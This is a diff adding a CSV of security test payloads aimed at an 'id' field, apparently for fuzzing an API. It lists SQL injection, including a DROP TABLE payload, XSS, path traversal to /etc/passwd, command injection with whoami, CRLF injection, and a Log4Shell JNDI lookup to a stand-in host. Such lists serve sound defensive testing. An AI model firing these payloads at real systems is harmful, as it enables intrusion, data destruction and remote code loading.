@@ -1,0 +1,19 @@
+﻿category,target_field,payload
+SQL Injection,id,' OR '1'='1
+SQL Injection,id,1; DROP TABLE Faculties;--
+SQL Injection,id,1 OR 1=1
+SQL Injection,id,1' ORDER BY 1--
+XSS,id,<script>alert(1)</script>
+XSS,id,<img src=x onerror=alert(1)>
+NoSQL Injection,id,{$ne:1}
+LDAP Injection,id,*)(uid=*
+Path Traversal,id,../../../../etc/passwd
+Path Traversal,id,....//....//etc/passwd
+Log4Shell,id,${jndi:ldap://evil.local/a}
+Template Injection,id,${7*7}
+Command Injection,id,1; whoami
+Command Injection,id,1 | whoami
+Null Byte,id,1%00
+CRLF Injection,id,1%0d%0aSet-Cookie: x=1
+Length,id,999999999999999999999999999999
+Empty,id,
